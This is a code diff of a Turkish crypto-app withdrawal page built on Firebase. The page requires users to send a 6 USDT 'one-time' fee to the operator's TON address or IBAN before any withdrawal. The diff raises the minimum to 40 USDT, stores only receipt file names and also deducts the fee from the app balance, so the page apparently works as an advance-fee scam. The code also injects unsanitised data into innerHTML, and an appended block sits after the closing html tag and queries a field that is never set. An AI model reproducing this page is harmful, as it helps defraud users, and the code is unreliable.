@@ -2,88 +2,120 @@
 <html lang="tr">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-<title>Para Çekme Formu</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Para Çek</title>
 <style>
+  /* Genel Reset */
+  * {
+    box-sizing: border-box;
+  }
   body {
-    font-family: Arial, sans-serif;
-    margin: 0; padding: 15px;
-    background: #f9f9f9;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #f5f7fa;
+    color: #333;
+    margin: 0;
+    padding: 20px;
     max-width: 480px;
     margin-left: auto;
     margin-right: auto;
   }
   h2 {
     text-align: center;
-    color: #333;
+    font-weight: 700;
+    color: #222;
+    margin-bottom: 30px;
   }
   form {
     background: #fff;
-    padding: 15px;
-    border-radius: 8px;
-    box-shadow: 0 2px 6px rgb(0 0 0 / 0.1);
+    border-radius: 10px;
+    padding: 25px 30px;
+    box-shadow: 0 6px 15px rgba(0,0,0,0.1);
   }
   label {
-    margin-top: 12px;
     display: block;
-    font-weight: bold;
-    color: #444;
+    margin-top: 20px;
+    font-weight: 600;
+    color: #555;
   }
-  select, input[type="text"], input[type="number"], input[type="file"], button {
+  select, input[type="text"], input[type="number"], input[type="file"] {
     width: 100%;
-    padding: 10px;
-    margin-top: 6px;
-    border-radius: 5px;
-    border: 1px solid #ccc;
-    box-sizing: border-box;
+    padding: 12px 14px;
+    margin-top: 8px;
+    border-radius: 6px;
+    border: 1.5px solid #ccc;
     font-size: 1rem;
+    transition: border-color 0.3s ease;
+  }
+  select:focus, input[type="text"]:focus, input[type="number"]:focus, input[type="file"]:focus {
+    border-color: #7aa7ff;
+    outline: none;
+    box-shadow: 0 0 6px rgba(122,167,255,0.5);
   }
   button {
-    background-color: #007bff;
-    color: white;
+    width: 100%;
+    padding: 14px;
+    margin-top: 30px;
+    background-color: #4a90e2;
     border: none;
-    margin-top: 20px;
+    border-radius: 8px;
+    color: white;
+    font-weight: 700;
+    font-size: 1.1rem;
     cursor: pointer;
-    font-weight: bold;
-    transition: background-color 0.3s ease;
+    transition: background-color 0.25s ease;
   }
   button:disabled {
-    background-color: #888;
+    background-color: #a5b8e0;
     cursor: not-allowed;
   }
+  button:hover:not(:disabled) {
+    background-color: #3573cc;
+  }
   #paymentNotice {
-    background: #fff3cd;
-    border: 1px solid #ffeeba;
-    color: #856404;
-    padding: 15px;
-    margin-top: 20px;
-    border-radius: 6px;
+    background: #e3f2fd;
+    border: 1px solid #90caf9;
+    color: #0d47a1;
+    padding: 18px 22px;
+    margin-top: 25px;
+    border-radius: 8px;
+    font-weight: 600;
+  }
+  #paymentNotice p {
+    margin: 0 0 12px 0;
+    font-size: 1.05rem;
+  }
+  #paymentDetails p {
+    margin: 6px 0;
   }
   #message {
-    margin-top: 15px;
+    margin-top: 22px;
     min-height: 24px;
-    font-weight: bold;
+    font-weight: 600;
     text-align: center;
   }
   #balanceDisplay {
-    margin-top: 10px;
-    font-weight: bold;
-    color: #222;
     text-align: center;
+    margin-bottom: 15px;
+    font-weight: 700;
+    font-size: 1.2rem;
+    color: #1e2a78;
   }
+
   @media (max-width: 480px) {
     body {
-      padding: 10px;
+      padding: 15px;
       max-width: 100%;
+    }
+    form {
+      padding: 20px;
     }
   }
 </style>
 </head>
 <body>
 
-<h2>Para Çekme Formu</h2>
+<h2>🏛️Para Çek🏛️</h2>
 
-<!-- Bakiye gösterimi -->
 <div id="balanceDisplay">Bakiye: Yükleniyor...</div>
 
 <form id="withdrawForm" onsubmit="return false;">
@@ -101,7 +133,7 @@
 </form>
 
 <div id="paymentNotice" style="display:none;">
-  <p><strong>Çekim Ücretini Yatırın (6 USDT)</strong></p>
+  <p><strong>TEK SEFERLİK Çekim Ücretini Yatırın (6 USDT)</strong></p>
 
   <label for="paymentOption">Ödeme Seçeneği:</label>
   <select id="paymentOption">
@@ -109,26 +141,23 @@
     <option value="ibanInfo">2. IBAN Bilgileri</option>
   </select>
 
-  <div id="paymentDetails" style="margin-top:12px;">
-    <!-- Ödeme bilgileri buraya gelecek -->
-  </div>
+  <div id="paymentDetails" style="margin-top:12px;"></div>
 
   <label for="receiptUpload">Dekont Yükle:</label>
-  <input type="file" id="receiptUpload" accept="image/*,application/pdf" />
+  <input type="file" id="receiptUpload" accept="image/*,application/pdf" required />
 
   <button id="paidBtn" disabled>Yatırdım</button>
 </div>
 
 <div id="message"></div>
 
-<!-- Firebase SDK -->
+<!-- Firebase SDK'ları -->
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
 
 <script>
-  // Firebase yapılandırması
+  // Firebase config
   const firebaseConfig = {
     apiKey: "AIzaSyBXddctTbfBzgJ9sgtVCvSMtNJRd3JVeHs",
     authDomain: "crypto-eccb4.firebaseapp.com",
@@ -140,10 +169,9 @@
   firebase.initializeApp(firebaseConfig);
   const auth = firebase.auth();
   const db = firebase.firestore();
-  const storage = firebase.storage();
 
-  const minWithdrawAmount = 3;   // Minimum çekim miktarı
-  const withdrawFee = 6;         // Çekim ücreti (USDT)
+  const minWithdrawAmount = 40;
+  const withdrawFee = 6;
 
   const myTonAddress = "UQDalUFWerAg7Bo8-NHtX8OgFHRHI8-OvqpqjXjRDZREXzaF";
   const myIbanInfo = {
@@ -166,8 +194,10 @@
   let currentMethod = null;
   let userTonAddress = "";
   let userBalance = 0;
+  let currentWithdrawAmount = 0;
+  let currentAddressOrInfo = {};
 
-  // *** Bakiye ve kullanıcı kontrolü - TARAMA SAYFASI İLE AYNI KOD ***
+  // Kullanıcı auth ve bakiye yükleme
   auth.onAuthStateChanged(async (user) => {
     if (!user) {
       window.location.href = "index.html";
@@ -191,6 +221,7 @@
     }
   });
 
+  // Çekim yöntemi seçimi sonrası dinamik alanlar
   methodSelect.addEventListener("change", () => {
     currentMethod = methodSelect.value;
     userTonAddress = "";
@@ -234,11 +265,10 @@
     }
   });
 
+  // Ödeme detayları güncelleme
   function updatePaymentDetails() {
     if (paymentOption.value === "tonAddress") {
-      paymentDetails.innerHTML = `
-        <p><strong>TON Adresi:</strong> ${myTonAddress}</p>
-      `;
+      paymentDetails.innerHTML = `<p><strong>TON Adresi:</strong> ${myTonAddress}</p>`;
     } else if (paymentOption.value === "ibanInfo") {
       paymentDetails.innerHTML = `
         <p><strong>IBAN:</strong> ${myIbanInfo.iban}</p>
@@ -247,9 +277,9 @@
       `;
     }
   }
-
   paymentOption.addEventListener("change", updatePaymentDetails);
 
+  // Para Çek butonuna basınca
   withdrawBtn.addEventListener("click", () => {
     messageDiv.style.color = "red";
     messageDiv.textContent = "";
@@ -308,82 +338,156 @@
       };
     }
 
-if (amount > userBalance) {
-  messageDiv.textContent = `Yetersiz bakiye. Bakiyeniz: ${userBalance.toFixed(4)} USDT. Minimum çekim: ${minWithdrawAmount} USDT.`;
-  return;
-}
+    if (amount > userBalance) {
+      messageDiv.textContent = `Yetersiz bakiye. Bakiyeniz: ${userBalance.toFixed(4)} USDT. Minimum çekim: ${minWithdrawAmount} USDT.`;
+      return;
+    }
+
+    currentWithdrawAmount = amount;
+    currentAddressOrInfo = addressOrInfo;
 
     paymentNotice.style.display = "block";
     paidBtn.disabled = true;
     receiptUpload.value = "";
     messageDiv.textContent = "";
+  });
 
-    receiptUpload.onchange = () => {
-      paidBtn.disabled = receiptUpload.files.length === 0;
-    };
+  // Dekont seçilince Yatırdım butonunu aktif et
+  receiptUpload.addEventListener("change", () => {
+    paidBtn.disabled = receiptUpload.files.length === 0;
+  });
 
-    paidBtn.onclick = async () => {
-      if (receiptUpload.files.length === 0) {
+  // Yatırdım butonuna basınca
+  paidBtn.addEventListener("click", async () => {
+    if (receiptUpload.files.length === 0) {
+      messageDiv.style.color = "red";
+      messageDiv.textContent = "Lütfen dekont dosyası seçin.";
+      return;
+    }
+
+    try {
+      messageDiv.style.color = "black";
+      messageDiv.textContent = "İşlem yapılıyor, lütfen bekleyin...";
+
+      const user = auth.currentUser;
+      if (!user) {
         messageDiv.style.color = "red";
-        messageDiv.textContent = "Lütfen dekont dosyası seçin.";
+        messageDiv.textContent = "Lütfen giriş yapın.";
         return;
       }
 
-      try {
-        messageDiv.style.color = "black";
-        messageDiv.textContent = "Dekont yükleniyor, lütfen bekleyin...";
+      // Storage upload KALDIRILDI, sadece Firestore işlem
 
-        const user = auth.currentUser;
-        if (!user) {
-          messageDiv.style.color = "red";
-          messageDiv.textContent = "Lütfen giriş yapın.";
-          return;
+      await db.runTransaction(async (t) => {
+        const userBalanceRef = db.collection("balances").doc(user.uid);
+        const userDoc = await t.get(userBalanceRef);
+        if (!userDoc.exists) throw new Error("Kullanıcı bakiyesi bulunamadı.");
+        const currentBalance = parseFloat(userDoc.data().amount || 0);
+        const totalDeduct = currentWithdrawAmount + withdrawFee;
+
+        if (currentBalance < totalDeduct) {
+          throw new Error("Yetersiz bakiye. Lütfen bakiye durumunuzu kontrol edin.");
         }
 
-        const file = receiptUpload.files[0];
-        const storageRef = storage.ref();
-        const fileRef = storageRef.child(`withdrawReceipts/${user.uid}/${Date.now()}_${file.name}`);
-        await fileRef.put(file);
-        const receiptUrl = await fileRef.getDownloadURL();
-
-        await db.collection("withdrawals").add({
+        const withdrawalRef = db.collection("withdrawals").doc();
+        t.set(withdrawalRef, {
           userId: user.uid,
           method: currentMethod,
-          amount: amount,
-          addressOrInfo: addressOrInfo,
+          amount: currentWithdrawAmount,
+          addressOrInfo: currentAddressOrInfo,
           paymentOption: paymentOption.value,
-          receiptUrl: receiptUrl,
+          receiptFileName: receiptUpload.files[0].name, // Sadece dosya adı kaydediliyor, dosya upload edilmiyor
           status: "pending",
           createdAt: firebase.firestore.FieldValue.serverTimestamp()
         });
 
-        // Bakiye güncelleme (sunucu tarafında gerçek kontrol olmalı)
-        userBalance -= (amount + withdrawFee);
-        balanceDisplay.textContent = `Bakiye: ${userBalance.toFixed(4)} USDT`;
+        t.update(userBalanceRef, { amount: currentBalance - totalDeduct });
+      });
 
-        messageDiv.style.color = "green";
-        messageDiv.textContent = "Çekim talebiniz başarıyla gönderildi.";
+      // Güncellenmiş bakiye gösterimi (client tarafı da güncelleniyor)
+      userBalance -= (currentWithdrawAmount + withdrawFee);
+      balanceDisplay.textContent = `Bakiye: ${userBalance.toFixed(4)} USDT`;
 
-        // Form sıfırlama
-        methodSelect.value = "";
-        dynamicFields.innerHTML = "";
-        paymentNotice.style.display = "none";
-        receiptUpload.value = "";
-        paidBtn.disabled = true;
-        currentMethod = null;
-        userTonAddress = "";
-        paymentOption.value = "tonAddress";
-        updatePaymentDetails();
+      messageDiv.style.color = "green";
+      messageDiv.textContent = "Çekim talebiniz Başarıyla alındı en kısa sürede sonuçlanacaktır.";
 
-      } catch (error) {
-        messageDiv.style.color = "red";
-        messageDiv.textContent = "Hata: " + error.message;
-        console.error(error);
-      }
-    };
+      // Form sıfırlama
+      methodSelect.value = "";
+      dynamicFields.innerHTML = "";
+      paymentNotice.style.display = "none";
+      receiptUpload.value = "";
+      paidBtn.disabled = true;
+      withdrawBtn.disabled = false;
+      currentMethod = null;
+      userTonAddress = "";
+      currentWithdrawAmount = 0;
+      currentAddressOrInfo = {};
+      paymentOption.value = "tonAddress";
+      updatePaymentDetails();
+
+    } catch (error) {
+      messageDiv.style.color = "red";
+      messageDiv.textContent = "Hata: " + error.message;
+      console.error(error);
+    }
   });
+
+  // Sayfa yüklendiğinde ödeme detaylarını göster
+  updatePaymentDetails();
 </script>
 
+</body>
+</html>
+
+<!-- Para çekme formunun hemen altına, </form> ve </div> kapanışlarından sonra ekle -->
+<h2>Çekim Taleplerim</h2>
+<table id="userWithdrawalsTable" style="width:100%; border-collapse: collapse; margin-top: 20px;" border="1">
+  <thead>
+    <tr>
+      <th style="padding:8px;">Miktar (USDT)</th>
+      <th style="padding:8px;">Durum</th>
+      <th style="padding:8px;">Red Sebebi</th>
+      <th style="padding:8px;">Talep Tarihi</th>
+    </tr>
+  </thead>
+  <tbody></tbody>
+</table>
+
+<script>
+  // Auth ve Firestore zaten var, ek olarak:
+  auth.onAuthStateChanged(user => {
+    if(user){
+      loadUserWithdrawals(user.email);
+    }
+  });
+
+  function loadUserWithdrawals(email){
+    db.collection("withdrawals")
+      .where("userEmail", "==", email)
+      .orderBy("createdAt", "desc")
+      .get()
+      .then(snapshot => {
+        const tbody = document.querySelector("#userWithdrawalsTable tbody");
+        tbody.innerHTML = "";
+        snapshot.forEach(doc => {
+          const w = doc.data();
+          const date = w.createdAt ? new Date(w.createdAt.seconds * 1000).toLocaleString() : "-";
+          const reason = w.reason || "-";
+          tbody.innerHTML += `
+            <tr>
+              <td style="padding:8px;">${w.amount.toFixed(4)}</td>
+              <td style="padding:8px; text-transform: capitalize;">${w.status}</td>
+              <td style="padding:8px;">${w.status === "rejected" ? reason : "-"}</td>
+              <td style="padding:8px;">${date}</td>
+            </tr>
+          `;
+        });
+      })
+      .catch(err => {
+        console.error("Çekim talepleri yüklenirken hata:", err);
+      });
+  }
+</script>
 </body>
 </html>
 <!-- sayfa içeriğin buraya -->
@@ -425,6 +529,7 @@ if (amount > userBalance) {
     }
   });
 </script>
+
+
 </body>
 </html>
-
